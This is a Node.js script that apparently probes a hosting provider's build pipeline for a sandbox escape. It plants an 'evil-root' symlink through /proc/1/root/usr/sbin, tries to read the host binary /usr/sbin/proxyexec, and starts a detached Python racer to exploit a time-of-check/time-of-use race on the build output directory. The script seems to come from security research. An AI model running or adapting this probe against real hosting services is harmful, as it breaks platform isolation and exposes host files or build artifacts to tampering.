import fs from "node:fs";
import path from "node:path";
import { spawn } from "node:child_process";

const marker = "HOSTINGER_NODE_OUTPUT_ROOT_TOCTOU_GATE:r220";
const output = path.resolve("dist");
const alternate = path.resolve("evil-root");
fs.rmSync(output, { recursive: true, force: true });
fs.rmSync(alternate, { recursive: true, force: true });
fs.mkdirSync(output, { recursive: true });
fs.writeFileSync(path.join(output, "control.txt"), `${marker}:894a8b0f9abe4351\n`, { mode: 0o600 });

const hiddenTarget = "../../../../../../../proc/1/root/usr/sbin";
let hiddenLink;
try {
  fs.symlinkSync(hiddenTarget, alternate);
  hiddenLink = { created: true, target: hiddenTarget, isSymlink: fs.lstatSync(alternate).isSymbolicLink() };
} catch (error) {
  hiddenLink = { created: false, target: hiddenTarget, errorCode: error.code ?? error.name };
}

let directRead;
try {
  const body = fs.readFileSync("/usr/sbin/proxyexec");
  directRead = { readable: true, bytes: body.length };
} catch (error) {
  directRead = { readable: false, errorCode: error.code ?? error.name };
}

const outputStat = fs.statSync(output);
let racer;
try {
  const child = spawn("python3", ["race-output-root.py"], {
    cwd: process.cwd(),
    detached: true,
    stdio: "ignore",
  });
  child.unref();
  racer = { started: true, pidPresent: Number.isInteger(child.pid) };
} catch (error) {
  racer = { started: false, errorCode: error.code ?? error.name };
}

console.log(JSON.stringify({
  marker,
  directRead,
  hiddenLink,
  safeOutput: {
    isDirectory: outputStat.isDirectory(),
    entries: fs.readdirSync(output).sort(),
  },
  racer,
  outputRelativeToRepository: path.relative(process.cwd(), output),
}));
